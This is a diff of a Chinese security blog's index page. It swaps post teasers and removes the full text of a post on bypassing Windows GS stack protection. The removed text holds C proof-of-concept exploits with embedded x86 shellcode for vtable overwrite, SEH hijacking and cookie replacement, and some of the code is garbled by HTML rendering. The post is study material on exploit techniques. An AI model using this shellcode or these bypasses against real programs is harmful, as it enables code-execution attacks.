@@ -497,6 +497,130 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/08/safeSEH的理解/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="loser">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="loser的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/08/safeSEH的理解/" itemprop="url">SafeSEH的理解</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-12-08T21:54:00+08:00">
+                2019-12-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>在Windows XP SP2 及后续版本的操作系统中，微软引入了著名的S.E.H 校验机制SafeSEH。<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/12/08/safeSEH的理解/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </p></div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/03/关于GS的栈保护突破/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -567,27 +691,17 @@
 
       
         
-          
-            <p>GS编译选项类似于在CSAPP里看到的加了个金丝雀值，加栈的安全性，<br>GS编译选项为每个函数调用增加了一些额外的数据，在函数调用时，会向栈中随机压入一个DWORD，位于EBP之前，在函数返回之前，系统将进行额外的验证这个值，发生栈溢出的话，这个值会改变，即可说明栈中发生了溢出。</p>
-<h1 id="利用未被保护的栈突破GS"><a href="#利用未被保护的栈突破GS" class="headerlink" title="利用未被保护的栈突破GS"></a>利用未被保护的栈突破GS</h1><p>因为GS编译选项对性能会有影响，所以并不是所有的函数都会被保护。如下，由于函数vulfuction 中不包含4 字节以上的缓冲区，所以即便GS 处于开启状态，这个函数是也不受保护的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int vulfuction(char * str)</span><br><span class="line">&#123;</span><br><span class="line">char arry[4];</span><br><span class="line">strcpy(arry,str);</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char* str=&quot;yeah,the fuction is without GS&quot;;</span><br><span class="line">vulfuction(str);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>在执行完函数vulfuction 返回时，没有进行任何Security Cookie 的验证操作，如果我们直接运行程序，程序会弹出异常对话框，我们使用VS 调试器进行调试，调试器会报告内存访问冲突。大家注意异常信息中的0x63756620，这不是一个普通的值，而是字符串“ fuc”经过ASCII 码转换后的值（注意倒序），这说明返回地址已经被覆盖。</p>
-<h1 id="覆盖虚函数突破GS"><a href="#覆盖虚函数突破GS" class="headerlink" title="覆盖虚函数突破GS"></a>覆盖虚函数突破GS</h1><p>GS机制在函数返回之前检查Security Cook,在这之前是没有任何检查的，我们可以在检查值之前进行程序劫持。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include&quot;stdafx.h&quot;</span><br><span class="line">#include&quot;string.h&quot;</span><br><span class="line">class GSVirtual &#123;</span><br><span class="line">public :</span><br><span class="line">void gsv(char * src)</span><br><span class="line">		&#123;</span><br><span class="line">			char buf[200];</span><br><span class="line">			strcpy(buf, src);</span><br><span class="line">			vir();</span><br><span class="line">		&#125;</span><br><span class="line">		virtualvoidvir()</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">GSVirtual test;</span><br><span class="line">test.gsv(</span><br><span class="line">&quot;\x04\x2b\x99\x7C&quot; //address of &quot;pop pop ret&quot;</span><br><span class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span><br><span class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span><br><span class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span><br><span class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span><br><span class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span><br><span class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span><br><span class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span><br><span class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span><br><span class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span><br><span class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span><br><span class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">	);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">思路如下：</span><br><span class="line">（1）类GSVirtual 中的gsv 函数存在典型的溢出漏洞。</span><br><span class="line">（2）类GSVirtual 中包含一个虚函数vir。</span><br><span class="line">（3）当gsv 函数中的buf 变量发生溢出的时候有可能会影响到虚表指针，如果我们可以控制虚表指针，将其指向我们的可以控制的内存空间，就可以在程序调用虚函数时控制程序的流程。</span><br><span class="line"></span><br><span class="line"># 攻击异常处理突破GS</span><br><span class="line">GS并没有对S.E.H提供保护，我们可以通过攻击程序的异常处理达到绕过GS的目的，我们首先通过超长字符串覆盖掉异常处理函数指针，然后想办法触发一个异常，程序就会转入异常处理，由于异常处理函数指针已经被我们覆盖，那么我们就可以通过劫持S.E.H 来控制程序的后续流程。</span><br></pre></td></tr></table></figure>
-<p>#include&lt;stdafx.h&gt;</p>
-<p>#include&lt;string.h&gt;<br>charshellcode[]=<br>“\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C”<br>“\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53”<br>“\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B”<br>“\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95”<br>“\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59”<br>“\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A”<br>“\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75”<br>“\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03”<br>“\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB”<br>“\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50”<br>“\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90”<br>“……”<br>“\x90\x90\x90\x90”<br>“\xA0\xFE\x12\x00”//address of shellcode<br>;<br>void test(char * input)<br>{<br>char buf[200];<br>strcpy(buf,input);<br>strcat(buf,input);<br>}<br>void main()<br>{<br>test(shellcode);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">对代码简要解释如下。</span><br><span class="line">（1）函数test 中存在典型的栈溢出漏洞。</span><br><span class="line">（2）在strcpy 操作后变量buf 会被溢出，当字符串足够长的时候程序的S.E.H 异常处理句柄也会被淹没。</span><br><span class="line"></span><br><span class="line">（3）由于strcpy 的溢出，覆盖了input 的地址，会造成strcat 从一个非法地址读取数据，这时会触发异常，程序转入异常处理，这样就可以在程序检查Security Cookie 前将程序流程劫持。</span><br><span class="line"></span><br><span class="line"># 替换GS的值</span><br><span class="line">同时替换栈中和.data 中的Cookie，绕过Security Cookie 的校验。</span><br></pre></td></tr></table></figure></p>
-<p>#include&lt;stdafx.h&gt;</p>
-<p>#include&lt;string.h&gt;</p>
-<p>#include&lt;stdlib.h&gt;<br>charShellcode[]=<br>“\x90\x90\x90\x90”//new value of cookie in .data<br>“\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C”<br>“\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53”<br>“\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B”<br>“\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95”<br>“\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59”<br>“\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A”<br>“\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75”<br>“\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03”<br>“\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB”<br>“\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50”<br>“\x53\xFF\x57\xFC\x53\xFF\x57\xF8”<br>“\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90”<br>“\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90”<br>“\xF4\x6F\x82\x90”//result of \x90\x90\x90\x90 xor EBP<br>“\x90\x90\x90\x90”<br>“\x94\xFE\x12\x00”//address of Shellcode<br>;<br>void test(char <em> s, int i, char </em> src)<br>{<br>char dest[200];<br>if(i&lt;0x9995)<br>{<br>char <em> buf=s+i;
-</em>buf=<em>src;
-</em>(buf+1)=<em>(src+1);
-</em>(buf+2)=<em>(src+2);
-</em>(buf+3)=<em>(src+3);<br>strcpy(dest,src);<br>}<br>}<br>void main()<br>{<br>char </em> str=(char *)malloc(0x10000);<br>test(str,0xFFFF2FB8,Shellcode);<br>}<br><code>`</code><br>对代码简要解释如下。<br>（1）main 函数中在堆中申请了0x10000 个字节的空间，并通过test 函数对其空间的内容进行操作。<br>（2）test 函数对s+i 到s+i+3 的内存进行赋值，虽然函数对i 进行了上限判断，但是没有判断i 是否大于0，当i 为负值时，s+i 所指向的空间就会脱离main 中申请的空间，进而有可能会指向.data 区域。</p>
-<p>（3）test 函数中的strcpy 存在典型的溢出漏洞。</p>
-
-          
+          <p>GS编译选项类似于在CSAPP里看到的加了个金丝雀值，加栈的安全性，<br>GS编译选项为每个函数调用增加了一些额外的数据，在函数调用时，会向栈中随机压入一个DWORD，位于EBP之前，在函数返回之前，系统将进行额外的验证这个值，发生栈溢出的话，这个值会改变，即可说明栈中发生了溢出。<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/12/03/关于GS的栈保护突破/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
-    </div>
+    </p></div>
     
     
     
@@ -1356,130 +1470,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/02/堆溢出利用/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="loser">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="loser的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/02/堆溢出利用/" itemprop="url">堆溢出利用</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-02T08:57:18+08:00">
-                2019-08-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>堆溢出利用就是用数据去溢出下一个堆块的块首，改写块首中的前向指针（flink）和后向指针（blink），然后在分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/08/02/堆溢出利用/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1530,7 +1520,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">54</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
